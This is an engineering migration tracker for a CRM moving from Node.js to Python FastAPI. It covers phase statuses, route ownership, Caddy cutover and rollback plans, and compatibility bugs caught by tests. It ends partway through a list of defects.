# Vistaar CRM — Node.js → Python migration tracker

Living document. Updated as each module completes, not at the end.

**Target:** Python FastAPI owns CRM business logic. Node retains only the Baileys WhatsApp
socket. One MongoDB, one Redis, one Caddy, one domain.

**Current scale:** 68,565 lines of Node source across 31 modules, 38,547 lines of tests.

---

## Status

Statuses: `not audited` · `audited` · `implemented` · `locally tested` · `ready to deploy` ·
`deployed` · `production verified` · `retired from Node`

| Phase | Module | Public routes | Status | Node retired? |
|---|---|---|---|---|
| 0 | health | `/health*` | **production verified** | no — Node still serves its own |
| 1 | starred-messages | `/starred-messages` | **deployed**; reads production verified, **writes never exercised** | no |
| 1b | validation patch | — | **ready to deploy** | — |
| 2 | stages | `/stages` | **ready to deploy** | no |
| 2 | tags (catalogue only) | `/tags` | **ready to deploy** | no |
| 3 | organizations | `/settings` | **ready to deploy** | no |
| 3 | message-templates | `/templates` | **ready to deploy** (needs 4 env vars) | no |
| 4 | **encryption + audit foundation** | — (libraries) | **locally tested** | n/a |
| 4 | contacts | `/contacts` | **ready to deploy** | no |
| 4 | users | `/users` | **ready to deploy** | no |
| 4 | **encryption, passwords, audit, transactions** | - (libraries) | **locally tested** | n/a |
| ~~4~~ -> 9 | media (serves `/messages`) | `/messages` | **re-scoped to Phase 9** | — |
| 5 | analytics — 4 shared libraries | — | **locally tested** | n/a |
| 5 | analytics — 7 routes | `/analytics` | **implemented, locally tested** | no |
| 6 | auth routes | `/auth` | **implemented, locally tested** | no |
| 7 | push | `/push` | **implemented, locally tested** | no |
| 7 | realtime | `/realtime` | **implemented, locally tested** | no |
| ~~7~~ → 9 | calls | `/calls` | **re-scoped to Phase 9** | — |
| 8 | runner audit + daily-job claim | — | **implemented, locally tested** (both services) | n/a |
| 8 | followups | `/follow-ups` | **implemented, locally tested** | no |
| 9 | **conversation visibility gate** | — (library) | **locally tested** | n/a |
| 9 | **redaction + activity log** | — (libraries) | **locally tested** | n/a |
| 9 | **notes** | `/conversations/:id/notes` | **implemented, locally tested** | no |
| 9 | **conversation-tags** | `/conversations/:id/tags` | **implemented, locally tested** | no |
| 9 | **media** | `/messages`, `/conversations/:id/media` | **implemented, locally tested** | no |
| 9 | followups, calls, conversations, lead-sources, Meta, ai-knowledge, runners | `/conversations`, `/lead-sources`, `/meta`, `/calls`, `/follow-ups`, `/ai/knowledge` | **implemented, locally tested** | no |
| 10 | ai-brain + 8 runners | `/ai-brain` | **implemented, locally tested** | no |
| 11 | whatsapp business logic & accounts | `/whatsapp-accounts` | **implemented, locally tested** | no |
| — | idempotency | none | **will not migrate** — no runtime consumer | stays, inert |
| — | dev-tools | none (prod) | **will not migrate** — unreachable in production | stays |
| — | Baileys gateway | — | **permanent Node** | never |

### Authoritative route map

Built by resolving every `app.use` in `app.ts` back to its import. **Module name does not
predict route** — this map, not the directory listing, is what the roadmap follows.

| Public mount | Module that serves it | Note |
|---|---|---|
| `/api/v1/health` | health | ✅ Python |
| `/api/v1/auth` | auth | ✅ Python |
| `/api/v1/users` | users | ✅ Python |
| `/api/v1/conversations` | conversations | ✅ Python **+ nested `notes`, `tags`, `calls`, `follow-ups`, `call-outcome`, `media`** |
| `/api/v1/analytics` | analytics | ✅ Python |
| `/api/v1/messages` | **media** | ✅ Python (`media.routes.ts`) |
| `/api/v1/contacts` | contacts | ✅ Python |
| `/api/v1/tags` | tags | ✅ Python |
| `/api/v1/stages` | stages | ✅ Python |
| `/api/v1/ai/knowledge` | ai-knowledge | ✅ Python |
| `/api/v1/templates` | message-templates | ✅ Python |
| `/api/v1/starred-messages` | starred-messages | ✅ Python, deployed |
| `/api/v1/ai-brain` | ai-brain | ✅ Python |
| `/api/v1/follow-ups` | followups | ✅ Python |
| `/api/v1/calls` | calls | ✅ Python |
| `/api/v1/push` | push | ✅ Python |
| `/api/v1/lead-sources` | lead-sources | ✅ Python |
| `/api/v1/meta` | **lead-sources** | ✅ Python (`meta-public.routes.ts`) |
| `/api/v1/whatsapp-accounts` | whatsapp-accounts | ✅ Python |
| `/api/v1/realtime` | realtime | ✅ Python |
| `/api/v1/settings` | organizations | ✅ Python |
| `/api/v1/dev-tools` | dev-tools | Mounted only when `NODE_ENV !== 'production'` |

**Library modules with no routes at all** — these migrate *with their first Python consumer*,
never standalone: `activity` · `ai` · `audit` · `messages` · `privacy` · `security` ·
`whatsapp` · `whatsapp-auth-states`. Plus `idempotency`, which has no consumer at all.

Three modules own **two** routers each (`tags`, `lead-sources`, `conversations`), and in every
case only one of the two can move independently. That pattern cost two scope corrections before
this map existed.

**A phase is not complete because its Python code exists.** Nothing above reaches
`production verified` until it has answered real traffic and been compared against Node.

### Test totals

| Suite | Count |
|---|---|
| Python | **13,499 passing, 28 skipped** (82 files) |
| Node | **3,221 passing** (131 files) |

## Phase 0 — foundation ✅

**Deployed.** Python on `:5002`, Caddy routes `/api/v1/health*` to it.

| | |
|---|---|
| Files | `crm-api/` — Dockerfile, config, db, cache, auth, main |
| Tests | 26 passing (health 16 + auth 10) |
| Verified | liveness identical to Node; readiness 200; `replicaSet.ok: true, actual: rs0` |
| Rollback | remove the Caddy `handle` block, reload |

**Two bugs found and fixed:** FastAPI routes were mounted at `/health` while Caddy's `handle`
forwards the prefix unchanged (would have 404'd at cutover); and the container could not reach
`localhost` Mongo/Redis until `network_mode: host` was added.

---

## Phase 1 — starred-messages ✅

Chosen over `organizations` after re-audit: `organizations` owns `/api/v1/settings`, a live
frontend route with writes, which would have made Python's first production write the owner's
phone number. `starred-messages` has zero cross-module dependencies, one collection, real
tests, and a worst-case failure that is cosmetic.

### Scope discovered during implementation

`authenticateRequest` is not just JWT verification — it performs **three database reads**
(user, organization, refresh session), checks both statuses, resolves **rotated sessions via
family lookup**, and derives permissions from the user record. Every protected route depends on
it, so the **auth middleware had to be built in Phase 1**, not Phase 6.

The split that keeps this safe: **Node remains the only token issuer**; Python only verifies.
The `/auth` routes (login, refresh, logout) stay in Node until Phase 6.

### Files added

| File | Purpose |
|---|---|
| `app/serialization.py` | `toISOString()`-exact dates, Node-compatible ids |
| `app/permissions.py` | role table + override resolution, ported verbatim |
| `app/deps.py` | the full auth chain as FastAPI dependencies |
| `app/routers/starred_messages.py` | the module |
| `tests/test_starred_messages.py` | 24 integration tests |
| `tools/compare_responses.py` | Node-vs-Python response diff harness |

### Behaviour preserved

- `GET /` → `{data: [...], meta: {count}}`, newest first, limit 200, escaped case-insensitive
  regex over title and body
- `POST /` → **201**, and **201 again with the existing record** when the same
  `sourceMessageId` is starred twice
- `PATCH /:id` → 200; 404 when unknown *or* not yours; rejects an empty patch
- `DELETE /:id` → 200 with the removed record
- Ownership enforced **in the query** on `(organizationId, userId)`, never as a follow-up check
- `userId` never serialized
- All four routes gated on `messages.send`

### Bug caught before deployment

**Node answers validation failures with `400`, not `422`** — `parseWithSchema` throws
`createHttpError({statusCode: 400, code: 'VALIDATION_FAILED'})`. FastAPI's default is 422 with
`{"detail": [...]}`, and the React client reads `error.code`. Every error response is now
reshaped in `app/errors.py` to Node's `{error:{code,message,details,requestId}}` envelope.

### Known deliberate differences

| Difference | Why |
|---|---|
| Timestamps set explicitly in Python | Mongoose `timestamps: true` is a library feature; nothing sets them when the driver writes directly |
| `find_one_and_delete` instead of read-then-delete | Same observable behaviour, one fewer round trip |

### Tests

**74 passing** — health 16, auth 10, auth-chain 24, starred-messages 24. Run against an in-memory MongoDB through the real router, not mocked
repositories — a mocked repository would have let every ownership test pass against a filter
that ignored `userId`.

Mutation-tested: dropping `userId` from the list query fails `test_SHOWS_ONLY_THIS_USERS_RECORDS`;
changing the duplicate-star status to 200 fails `test_A_DUPLICATE_STAR_RETURNS_201...`.

### Deployed — 2026-11-07

Sequence actually followed: pull → rebuild → restart → verify `:5002` directly → **compare
against Node while Node still owned the route** → Caddy block → verify publicly.

The comparison step is the one that cannot be repeated. Once Caddy moved the route, Node stopped
being reachable for it and the reference was gone.

| Check | Result |
|---|---|
| `:5002` readiness | 200, `replicaSet.ok: true, actual: rs0` |
| Unauthenticated compare | IDENTICAL, after three fixes it forced |
| Authenticated compare, list | IDENTICAL |
| Authenticated compare, `?search=test` | IDENTICAL |
| Public `/api/v1/starred-messages` | 401, `content-type: application/json` — Python |
| Public `/api/v1/stages` | 401, `content-type: application/json; charset=utf-8` — Node, unchanged |
| Public authenticated read | 200 |

**`content-type` is the discriminator.** Express sends `application/json; charset=utf-8`,
FastAPI sends `application/json`. The harness compares the two without parameters — correctly,
since no client cares — but it is what proves which service answered a given request.

### Verified in production: the READ path only

| Path | Verified in production |
|---|---|
| `GET /api/v1/starred-messages` | ✅ 200, list and `?search=` both IDENTICAL to Node |
| 401 on every unauthenticated route | ✅ IDENTICAL to Node |
| `POST /api/v1/starred-messages` | ❌ **not verified** |
| `PATCH /api/v1/starred-messages/:id` | ❌ **not verified** |
| `DELETE /api/v1/starred-messages/:id` | ❌ **not verified** |

**The manual production write test was intentionally skipped by the owner.** It is not an
oversight and is not to be re-requested unless a future technical issue makes it essential.

The three write routes have run only against an in-memory MongoDB. The comparison harness is
read-only by design — it refuses non-GET without `--allow-writes`, which was never passed,
because pointing it at a production POST would create real records.

**Residual risk, accepted and open.** This does NOT block Phase 2. What is genuinely unproven
is the small set of behaviours that only a real write exercises:

| Unproven | Why the in-memory tests do not settle it |
|---|---|
| The partial unique index on `sourceMessageId` | `mongomock` does not enforce real indexes, so the duplicate-star path is covered by application logic only |
| `insert_one` against the real replica set | Write concern and the `rs0` majority ack are not exercised by a mock |
| Explicit timestamps vs. the Mongoose-written rows already in the collection | Existing documents were written by Mongoose; nothing has yet compared a Python-written row beside them |

First real exercise will be ordinary use of the app. If a star fails to save, the rollback is
unchanged: delete the Caddy block, reload, and Node serves the route again immediately.

**Rollback:** remove the Caddy block, reload. Node still serves the route throughout.

### What the comparison harness caught — before any traffic moved

Run against the live Node and Python services with no credentials at all, the first invocation
reported two differences on the 401 path. Both were real, and a third fell out of investigating
them.

| Difference | Node | Python (before) |
|---|---|---|
| `error.message` on every 401 | `Authentication failed.` | the specific message, e.g. `Authentication token is required.` |
| `error.requestId` | a uuid, echoed in `x-request-id` | `null`, no header |
| `Authorization` prefix | `Bearer ` only (case-**sensitive**) | `bearer` accepted too |

**Why the messages were wrong.** `authenticateRequest` wraps its whole body in a try/catch and
re-emits every error with `code: getErrorCode(error)` preserved and the message replaced. So
Node's code is specific and its message never is. The port reproduced the throw sites faithfully
and missed the catch.

**Why 24 tests did not catch it.** Every assertion in `test_deps.py` read `error.code`. Not one
read `error.message` or `error.requestId`. Nine tests now cover the error body itself, the
`x-request-id` header, inbound-id passthrough, and the case-sensitive prefix — all three
mutations caught.

**Why `requestId: null` was the wrong call.** It was documented as "null rather than invented".
But the id is what connects a customer's "it failed" to a line in the server log, and half the
API answering with null makes that work on some routes and silently not on others.
`app/request_context.py` now ports `request-context.middleware.ts`: inbound `x-request-id` wins,
otherwise a uuid4, echoed on the response.

**Python suite: 159 passing.**

### One deliberate non-port

Node's auth catch swallows *any* exception — including a MongoDB failure — and answers **401**
with `code` set to the error's message. During a database outage that logs every user out.
Python lets it reach the 500 handler instead. This is the one place the port knowingly differs,
because reproducing it would mean reproducing a defect that does harm. Recorded here rather than
left as a silent difference.

---

## Phase 2 — stages + tag catalogue 🟡

The original phase bundled six modules. **Four of them have no routes** and are internal
libraries consumed by other modules:

| Module | Routes | Consumed by | First Python consumer |
|---|---|---|---|
| stages | `/api/v1/stages` | — | — |
| tags | `/api/v1/tags` | — | — |
| activity | **none** | 9 modules | Phase 7 at the earliest |
| audit | **none** | 6 modules | Phase 4 |
| privacy | **none** | 4 modules | Phase 4 |
| idempotency | **none** | **nothing** | never |

**Porting a library module before its first Python consumer creates duplicate business logic
in both languages for months** — which is precisely what the final state forbids, and there is
no Caddy route to cut over, so nothing would be verifiable in production either.

**Revised Phase 2 = `stages` + `tags` only.** `activity`, `audit` and `privacy` are ported
*alongside* the first Python module that needs them. That is not a delay; it is the only point
at which they can be verified.

### Two modules that should not be migrated at all

**`idempotency` (245 lines) — no runtime consumer.** Its only references are
`scripts/reset-conversation-data.ts` and `scripts/verify-indexes.ts`, both of which enumerate
every model. No request path reads or writes `IdempotencyRecord`.

→ **Do not migrate.** Do not delete either: the collection may hold historical documents in
production, and removing a model is a separate decision requiring your approval. Left in Node,
inert.

**`dev-tools` (287 lines) — verified unreachable in production.** `app.ts:121` mounts it only
when `NODE_ENV !== 'production'`, and production reports `"environment":"production"`. The path
does not exist on the live server.

→ **Do not migrate.** One live consequence worth noting: `frontend/src/api/endpoints.ts:591-601`
still calls `/dev-tools/test-mode`, `/clear-test-data` and `/call-owner`, all of which **404 in
production today**. That is a pre-existing frontend issue, not something the migration
introduced, and deleting the module is a separate decision.

### `tags` is two modules wearing one coat

`tag.routes.ts` exports **two** routers. Only the first can move:

| Router | Mounted at | Touches |
|---|---|---|
| `tagRouter` | `/api/v1/tags` — list, create, archive | Tag collection only ✅ |
| `conversationTagRouter` | `/conversations/:id/tags` — attach, detach | conversations visibility + conversation writes + activity log, **in one transaction** ❌ |

Attach/detach call `loadVisibleConversationForActor`, `addTagToConversation` and `createActivity`
inside `runInTransaction`. Migrating them would drag the whole conversations module along, so
they **move in Phase 9**. Caddy cuts over `/api/v1/tags*` only; `/api/v1/conversations/*` is
untouched, so the split needs no special matcher.

**Phase 2 migrates: all 4 stage routes + 3 of the 5 tag routes.**

### The cross-service seam: Node keeps reading both collections

Moving the routes does not move the collections. After cutover, Node still reads them:

| Node caller | Reads | Why it stays |
|---|---|---|
| `conversation.service.ts` → `resolveUsableStageValue` | Stage | Validates every stage change; conversations are Phase 9 |
| `whatsapp-account.repository.ts:394` | Tag | Deletes an account's tags when the account is deleted |

This is a shared **database**, not shared code — acceptable — but it creates one hard invariant:
**`normalizeStageKey` and `normalizeTagSlug` must be byte-identical in Python.** A stage Python
writes as `follow_up` instead of `follow-up` is a stage the owner can see in the list and cannot
assign to a lead, and nothing fails at deploy time. Both normalisers are now pinned by an
explicit input→output table.

### Characterisation tests — written ✅

Both modules had **zero tests**. Four files, **92 tests**, against the Node implementation:

| File | Tests |
|---|---|
| `stages/stage.service.test.ts` | 45 |
| `stages/stage.repository.test.ts` | 14 |
| `tags/tag.service.test.ts` | 21 |
| `tags/tag.repository.test.ts` | 12 |

Filters are asserted rather than results — a filter missing `organizationId` still returns rows,
so the returned value proves nothing about tenancy.

Mutation-tested, each mutation caught:

| Mutation | Caught by |
|---|---|
| `[^a-z0-9]+` → `[^a-z0-9]` in the key normaliser | 12 tests |
| reserved built-in stage guard → `if (false)` | (same run) |
| account tag list drops the global `$in: [null, …]` | 1 test |
| `findTagById` drops `organizationId` | 1 test |
| activity row written outside the transaction | 1 test |

**Node suite: 3,204 passing** (was 3,112).

### Behaviour the port must reproduce

- `meta` on list responses is `{limit, skip, count}` — **not** starred-messages' `{count}`
- stages sort by `label` ascending; tags sort by `name` ascending; both default `limit` 100, `skip` 0
- tag uniqueness is per **(organization, whatsappAccountId, slug)** — a global `vip` and an
  account-scoped `vip` may coexist
- `whatsappAccountId: null` is a **value to match**, not an absent filter
- archive is `findOneAndUpdate` with `returnDocument: 'after'`; the route answers with the
  archived row, so returning the pre-update document would show `active` right after archiving
- stage delete is permanent and scoped in the query; conversations already on that stage keep the
  raw key string (no cascade)
- error codes: `STAGE_NOT_FOUND` 404 · `STAGE_KEY_EXISTS` 409 · `STAGE_KEY_RESERVED` 400 ·
  `TAG_NOT_FOUND` 404 · `TAG_SLUG_EXISTS` 409
- the reserved-key check runs **before** the duplicate lookup, so a reserved key answers 400, never 409

### Python implementation ✅

| File | Purpose |
|---|---|
| `app/routers/stages.py` | 4 routes — list, create, archive, delete |
| `app/routers/tags.py` | 3 routes — list, create, archive (the catalogue only) |
| `tests/test_stages.py` | 50 tests |
| `tests/test_tags.py` | 36 tests |

**Python suite: 175 passing** (was 74). Run against an in-memory MongoDB through the real
router — a mocked repository would let every tenancy test pass against a filter that ignored
`organizationId`.

Mutation-tested, each caught:

| Mutation | Result |
|---|---|
| account tag list drops the global `$in: [None, …]` | 17 failures across the 5 mutations |
| tag uniqueness collapsed to per-organisation | ” |
| reserved-stage guard → `if False:` | ” |
| normaliser loses the `+` | ” |
| stage delete drops `organizationId` | ” |

### Three Phase 1 divergences found while porting, and fixed

Porting a second module is what surfaced them; all three affect `starred-messages` too and are
fixed **before** Phase 1 deploys.

1. **403 bodies were missing `details`.** Node sends `{requiredPermissions: [...]}` from
   `requirePermissions` and `{requiredAnyPermissions: [...]}` from `requireAnyPermission` — the
   only way a caller can tell "you need all of these" from "you need one of these". Python sent
   `null`.
2. **The password-change message was invented.** Node: *"You must change your password before
   using the application."* Python had *"Password change is required."*
3. **An unhandled exception escaped the envelope.** Starlette answers with the plain-text body
   `Internal Server Error` and no JSON, so the React client's `error.code` read throws while
   handling the error and the user sees a blank screen. Node's handler never does that. A
   generic handler now produces Node's envelope, hiding the message in production exactly as
   `error.middleware.ts` does.

`require_any_permission` is new in `deps.py`: `requireConversationsRead` accepts **either**
`conversations.read_assigned` or `conversations.read_all`, and collapsing that into "all of"
would lock every `staff` user out of the stage and tag pickers.

### Carried-forward defect, deliberately preserved

A stage label of only punctuation normalises to `""`, which the Mongoose schema rejects — and
the Node controller does not map that error, so it reaches the error middleware as a plain
`Error` and the caller gets a **500**. Python raises the same 500 rather than letting the insert
succeed: writing a stage row with an empty key would be worse than the bug, because nothing
could ever select it. To be fixed in both services at once, not quietly changed in one.

### Caddy cutover for this phase

```
handle /api/v1/stages* { reverse_proxy localhost:5002 }
handle /api/v1/tags*   { reverse_proxy localhost:5002 }
```

`/api/v1/conversations/*` is deliberately untouched, so `/conversations/:id/tags` keeps being
served by Node. A test asserts the Python service answers 404 for that path — if it ever started
answering, two services would be writing the same conversation and only one inside a
transaction.

### Four compatibility defects found reviewing Phase 2 against the Node originals

None changed a status code. All four changed either the error body or the accept/reject
boundary — the kind of difference a green suite hides.

| # | Defect | Node | Python (before) |
|---|---|---|---|
| 1 | Trim ran *after* the length check | `.trim().min(1).max(60)` accepts 60 chars + trailing spaces | rejected it as too long |
| 2 | `error.details` keyed `_` | zod `fieldErrors`, keyed by field name | model-level `loc` → `{"_": [...]}` |
| 3 | No unstorable-slug guard on tags | Mongoose rejects `slug: ""` → 500 | would have **written** an unselectable row |
| 4 | Hand-rolled `whatsappAccountId` query check | 400 with `details.whatsappAccountId` | 400 with `details: null` |

Defect 3 is the one that mattered: an empty slug is not merely unusable, it occupies the
uniqueness slot for every later empty-slug attempt in the same scope.

**Defects 1 and 2 also affected `starred_messages.py`, which is already in production**, and
writing its regression tests exposed a fifth:

| # | Defect | Effect |
|---|---|---|
| 5 | `_field_errors` dropped `"body"` from anywhere in `loc`, not just the leading location marker | `starred-messages` has a field literally **named** `body`, so its `loc` is `("body", "body")` and both were stripped. The error landed under `_` instead of `body` — a client reading `details.body` found nothing for the field most likely to fail validation |

Defect 5 is in `app/errors.py`, which is **shared by every module in every later phase**. It
would have silently mis-keyed validation errors for any future field named `body`, `query` or
`path`.

All five mutation-tested; every mutation caught. **Python suite: 175 passing.**

### One deliberate superset

zod drops object-level `.refine` messages from `fieldErrors`, so Node sends `details: {}` for an
empty PATCH. Python sends `{"_": ["Provide a title or a body to update."]}`. Kept, because no
client enumerates the keys and dropping the message would make the failure harder to diagnose
than Node's. Recorded rather than left silent.

---

## Phase 2 — deployment and cutover plan (NOT executed)

### Routes Python will own

| Method | Path | Permission |
|---|---|---|
| GET | `/api/v1/stages` | `conversations.read_assigned` **or** `read_all` |
| POST | `/api/v1/stages` | `crm.stage.manage` |
| PATCH | `/api/v1/stages/:stageId/archive` | `crm.stage.manage` |
| DELETE | `/api/v1/stages/:stageId` | `crm.stage.manage` |
| GET | `/api/v1/tags` | `conversations.read_assigned` **or** `read_all` |
| POST | `/api/v1/tags` | `crm.tags.manage` |
| PATCH | `/api/v1/tags/:tagId/archive` | `crm.tags.manage` |

### Routes Node keeps

Everything else, including **`POST /api/v1/conversations/:id/tags`** and
**`DELETE /api/v1/conversations/:id/tags/:tagId`**. Those are the same Express module but a
different router, and they move in Phase 9 with conversations.

### Pre-flight checks

| Check | Status |
|---|---|
| Python paths match the public API exactly | ✅ `API_PREFIX = "/api/v1"`, routers mounted at `/stages` and `/tags`; Caddy `handle` forwards the prefix unchanged |
| Collections reachable | ✅ `stages`, `tags` — Mongoose default naming (lowercase plural, no `collection:` override in either model) |
| Indexes | ✅ Created by Mongoose, already present. Python creates none and relies on them. A duplicate-key race raises `DuplicateKeyError` → 500, exactly as Node's unmapped `E11000` does |
| Concurrent read/write by both services | ✅ Safe. Node keeps reading `stages` via `resolveUsableStageValue` and `tags` via `whatsapp-account.repository.ts:394`. Shared database, no shared code. The contract is `normalize_stage_key` / `normalize_tag_slug`, pinned by identical tables on both sides |
| Transactions | ✅ None needed. The seven routes above use no transaction and write no activity row in Node either — verified: `runInTransaction` appears only inside `attachTagToConversationForActor` and `detachTagFromConversationForActor` |
| Phase 2 routers registered in `main.py` | ❌ **Not yet, by design.** The two `include_router` lines are part of the cutover commit |

### Cutover order

1. Register the two routers in `main.py`; commit and push
2. Pull, rebuild, restart `crm-api` on the server
3. Verify `:5002` directly — `/api/v1/stages` must answer 401, not 404
4. **Run `compare_responses.py` for every GET, against both services, while Node still owns the
   routes.** Minimum set: `/api/v1/stages`, `?status=active`, `?status=archived`,
   `?limit=1&skip=0`, `/api/v1/tags`, `?whatsappAccountId=<real id>`, `?status=active`
5. Only then add the two Caddy blocks
6. Verify publicly, and confirm `/api/v1/conversations/:id/tags` still reports
   `content-type: application/json; charset=utf-8` — i.e. still Node

Step 4 cannot be repeated after step 5. Once Caddy moves a route, the Node reference is gone.

### Caddy blocks

```
handle /api/v1/stages* { reverse_proxy localhost:5002 }
handle /api/v1/tags*   { reverse_proxy localhost:5002 }
```

Both are more specific than `/api/*`, which Caddy sorts ahead automatically — the existing
health and starred-messages blocks prove the pattern.

**`/api/v1/tags*` does not match `/api/v1/conversations/:id/tags`.** Different prefix; the
conversation route stays inside the `/api/*` block.

### Rollback

Delete the two blocks, `sudo caddy validate`, `sudo systemctl reload caddy`. Node serves both
routes continuously throughout and never stops. Container-level fallback:
`docker compose stop crm-api` — Node is unaffected, though that also drops health and
starred-messages back to 502 until the Caddy blocks for those are removed too.

---

## Phase 3 — audit complete, scope revised 🔵

### `notes` is not a Phase 3 module

`note.routes.ts` is never mounted in `app.ts`. Its only importer is
`conversation.routes.ts:18`, which mounts it at **`/conversations/:conversationId/notes`** —
`Router({ mergeParams: true })`, three routes, all gated on `requireConversationsRead`.

Exactly the `conversation-tags` situation. There is no `/api/v1/notes` prefix for Caddy to cut
over, and the routes read `conversationId` from the parent router's params.

→ **Moved to Phase 9**, with conversations. The roadmap table above is updated.

### Actual Phase 3 route surface

| Method | Path | Permission | Notes |
|---|---|---|---|
| GET | `/api/v1/settings` | `settings.manage` | **No `settings.read` exists.** Read is gated the same as write — the owner's personal phone is org configuration, not team-visible |
| PATCH | `/api/v1/settings` | `settings.manage` | |
| GET | `/api/v1/templates` | `messages.send` | Deliberately NOT `templates.manage` — whoever answers the lead must be able to reach for a saved quote |
| POST | `/api/v1/templates/generate` | `ai.generate` | **Calls the AI brain service** |
| POST | `/api/v1/templates` | `templates.manage` | Goes out verbatim under the studio's name, contains its prices |
| DELETE | `/api/v1/templates/:templateId` | `templates.manage` | |

Three different permissions across four routes on one router. A port that gated the whole
router uniformly would either lock staff out of the quote picker or let them rewrite the
studio's prices.

### Existing test coverage — better than Phase 2 had

| Module | Existing Node tests |
|---|---|
| `organizations` | `organization-settings.service.test.ts`, `organization-settings.validation.test.ts` |
| `message-templates` | `message-template.service.test.ts` |

Characterisation tests still need writing for the **controller/HTTP layer** — status codes,
`meta` shape, error envelopes — which none of the existing files touch.

### ⚠️ Blocker requiring a decision: `POST /templates/generate` needs new environment variables

`message-template.service.ts:12` imports `generatePriceTemplates` from
`ai-brain/ai-brain.client.ts`, which is a plain HTTP client — `fetch` to
`AI_BRAIN_SERVICE_URL` with an `X-Service-Key` header. **No LLM SDK is involved**, so porting it
to `httpx` is straightforward.

The problem is configuration, not code. `crm-api` would need:

`AI_BRAIN_ENABLED` · `AI_BRAIN_SERVICE_URL` · `AI_BRAIN_SERVICE_KEY` · `AI_BRAIN_REQUEST_TIMEOUT_MS`

These live in `backend/.env`, and the container's `environment:` block was deliberately written
to pass only the variables `crm-api` needs — that was the explicit requirement when Phase 0 was
approved. Adding four more is a **Docker configuration change needing approval**, and one of
them is a service key.

**Two ways to proceed, neither started:**

| Option | Consequence |
|---|---|
| **A — split the phase.** Migrate `/settings` and the three non-generate `/templates` routes now; leave `POST /templates/generate` in Node until the env decision | Caddy needs a more specific block for the generate route to stay on Node, since `/api/v1/templates*` would otherwise capture it |
| **B — add the four variables**, migrate all four routes together | One Docker change, reviewed; no split routing |

**Recommendation: B.** Option A means a Caddy rule whose only purpose is to route one POST back
to Node, and that rule is easy to get wrong — `handle` matches by prefix, and
`/api/v1/templates/generate` is a *longer* prefix than `/api/v1/templates`, so it would need to
be listed and would silently stop working if reordered. One reviewed env change is the smaller
risk.

Awaiting the decision. Phase 3 local work on `/settings` proceeds regardless — it has no AI
dependency.

---

## Node responsibilities that will remain permanently

| Component | Lines | Reason |
|---|---|---|
| `whatsapp/providers/baileys.provider.ts` | ~400 | Only file importing Baileys; no Python equivalent exists |
| `whatsapp/sessions/*` | ~900 | Socket lifecycle, QR pairing, reconnection |
| `whatsapp-auth-states` | 361 | Credentials Baileys reads directly |

**~1,700 lines.** Everything else in the 6,680-line `whatsapp` module is business logic and
moves to Python in Phase 11.

---

## Modules with no tests — characterisation tests required first

~5,400 lines with no behavioural specification. These cannot be migrated from the code alone
without risking a silent business-rule change.

`users` (1,292) · `realtime` (788) · ~~`tags` (781)~~ ✅ · `contacts` (763) · ~~`stages` (600)~~ ✅ ·
`notes` (585) · `whatsapp-auth-states` (361) · `audit` (307) · `dev-tools` (287) ·
`idempotency` (245) · `privacy` (215) · `activity` (196)

---

## Background runners — ownership map

**All 13 remain in Node.** Not one has moved. The rule for Phase 8: a runner lives in exactly
one service, ever. Two services running the same sweep sends a customer the same message twice.

`autoGreet` · `bookingCountdown` · `delivery` · `digest` · `eventReminder` · `leadImport` ·
`morningRead` · `nurture` · `ownerCallEscalation` · `paymentFollowUp` · `promiseFollowUp` ·
`realtimeOutbox` · `reminder`

---

## Open risks

| Risk | Status |
|---|---|
| ~~Validation error body shape~~ | ✅ **Resolved.** Node answers **400** `{error:{code,message,details,requestId}}`, FastAPI defaults to 422 `{detail:[...]}`. Reshaped in `app/errors.py`; 4 tests pin it |
| **Schema drift** — Pydantic and Mongoose must agree independently | No CI check yet |
| **Phase 1 write paths never exercised in production** | Open, accepted; manual test intentionally skipped by the owner |
| **`mongomock-motor` is in the production image** | Open. Move to `requirements-dev.txt` without breaking the current test setup |
| **Node turns a Mongo outage into 401, Python into 500** | Documented, deliberate. Neither service to be changed silently |
| **Server has 28 pending OS updates and `*** System restart required ***`** | Open. Not to be restarted or updated |
| **Validator defects 1 and 2 are live in `starred-messages`** | Fixed locally, pending a Phase 1 patch deploy |
| **`setDefaultsOnInsert`** — 4 Mongoose sites; Python must set defaults explicitly | Handled in Phase 1 (timestamps); re-check per module |
| **Double-sending** in Phase 8 | Mitigation designed, not yet implemented |
| **Session loss** in Phase 11 | Node keeps the socket throughout |

---

## Rules in force

- No commit, push, SSH, deploy or production restart without explicit approval
- `docker-compose.yml` is **not** in git — the production file has uncommitted loopback
  bindings; see `crm-api/DEPLOY.md`
- Never `git add .` / `-A`, never `reset` / `clean` / `stash`
- Node is not removed until the Python replacement is verified **in production**


---

## Phase 4 — contacts, users, and four shared libraries

### Scope correction: media moves to Phase 9

`modules/media` has exactly **one** route, `GET /api/v1/messages/:messageId/media`. The other
~2,000 lines are the inbound WhatsApp media pipeline, which belongs to Phase 11.

That single route cannot move in Phase 4, for two independent reasons:

1. **`media.controller.ts:26` imports `loadVisibleConversationForActor`** - the same
   conversations dependency that already moved notes and conversation-tags to Phase 9. The
   handler applies the per-actor visibility rule so assignment-restricted staff cannot reach a
   photo from a lead they cannot open.
2. **The bytes live on the host filesystem.** `media-storage.service.ts` reads
   `MEDIA_STORAGE_DIR` with `node:fs`. Node runs on the host under systemd; `crm-api` runs in a
   container. Serving this from Python needs a bind mount that does not exist, and a missing
   mount returns 404 for every attachment.

-> **Moved to Phase 9**, where the visibility rule arrives anyway and the mount can be added once.

### Four shared libraries, each built because Phase 4 was its first consumer

| File | Ports | First consumer |
|---|---|---|
| `app/encryption.py` | `security/encryption.service.ts` | contacts reveal-phone |
| `app/passwords.py` | `auth/password.service.ts` | users create / reset-password |
| `app/audit.py` | `audit/audit.repository.ts` | both |
| `app/transactions.py` | `config/database.ts` `runInTransaction` | users disable / reset |

### Cross-language compatibility, proven against Node - not against itself

| Format | Fixtures generated by | Tests |
|---|---|---|
| AES-256-GCM field envelopes | `tools/make_encryption_fixtures.mjs`, calling the real `encryptString`/`encryptJson` | 26 |
| bcrypt password hashes | bcryptjs at cost 4 | 38 |

A port tested against its own output proves two implementations agree on a shape the production
database has never seen. The encryption fixtures came out of the code that wrote every encrypted
row in production. The bcrypt fixtures came out of the library that will verify every hash
Python writes, because **Node owns `/auth/login` until Phase 6**.

### Three real defects these tests found

| # | Defect | Consequence if shipped |
|---|---|---|
| 6 | The `bcrypt` wheel is a Rust extension that **panics** on a malformed hash. `pyo3_runtime.PanicException` inherits from `BaseException`, so `except Exception` does not catch it | One corrupted `passwordHash` row would 500 the login route for **every** user, not just that account. The hash shape is now validated before `checkpw` is called |
